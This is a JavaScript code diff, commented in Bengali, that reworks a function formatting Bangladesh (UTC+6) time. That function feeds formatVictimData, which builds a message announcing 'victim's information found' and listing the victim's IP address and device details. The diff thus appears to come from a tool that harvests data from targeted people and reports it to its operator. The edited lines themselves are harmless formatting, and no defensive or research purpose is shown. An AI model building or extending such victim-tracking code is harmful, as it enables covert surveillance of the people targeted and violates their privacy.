@@ -201,23 +201,27 @@ function getDeviceModel(device) {
 }
 
 // ================================================================
-// 🔥 বাংলাদেশ সময় তৈরি করার ফাংশন (সরাসরি UTC+6 অফসেট)
+// 🔥 বাংলাদেশ সময় তৈরির ফাংশন (সরাসরি UTC+6 অফসেট + ম্যানুয়াল ফরম্যাট)
 // ================================================================
 function getBangladeshTime() {
     const now = new Date();
-    // UTC থেকে +6 ঘন্টা যোগ করুন
-    const bangladeshTime = new Date(now.getTime() + (6 * 60 * 60 * 1000));
-    // ফরম্যাট করুন (বাংলা মাস ও দিনের জন্য আমরা English locale ব্যবহার করছি)
-    return bangladeshTime.toLocaleString('bn-BD', {
-        timeZone: 'Asia/Dhaka', // এটাই সঠিক
-        year: 'numeric',
-        month: '2-digit',
-        day: '2-digit',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit',
-        hour12: true
-    });
+    // UTC+6 অফসেট যোগ করুন (৬ ঘন্টা = ২১৬০০০০০ মিলিসেকেন্ড)
+    const bdTime = new Date(now.getTime() + (6 * 60 * 60 * 1000));
+    
+    // দিন, মাস, বছর, ঘন্টা, মিনিট, সেকেন্ড বের করুন
+    const day = String(bdTime.getUTCDate()).padStart(2, '0');
+    const month = String(bdTime.getUTCMonth() + 1).padStart(2, '0');
+    const year = bdTime.getUTCFullYear();
+    
+    let hours = bdTime.getUTCHours();
+    const minutes = String(bdTime.getUTCMinutes()).padStart(2, '0');
+    const seconds = String(bdTime.getUTCSeconds()).padStart(2, '0');
+    const ampm = hours >= 12 ? 'PM' : 'AM';
+    hours = hours % 12 || 12; // ১২ ঘন্টা ফরম্যাট
+    
+    // বাংলা সংখ্যায় রূপান্তর (ঐচ্ছিক, তবে আমরা ইংরেজি সংখ্যায় রাখলাম কারণ ইউজার সেটাই দেখতে চায়)
+    // ফরম্যাট: দিন/মাস/বছর, ঘন্টা:মিনিট:সেকেন্ড AM/PM
+    return `${day}/${month}/${year}, ${hours}:${minutes}:${seconds} ${ampm}`;
 }
 
 // ================================================================
@@ -226,8 +230,8 @@ function getBangladeshTime() {
 function formatVictimData(victim) {
     const d = victim.device || {};
     
-    // 🔥 বাংলাদেশ সময়
-    const deviceTime = getBangladeshTime(); // ব্যবহার করুন
+    // বাংলাদেশ সময়
+    const deviceTime = getBangladeshTime();
     
     let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
     msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
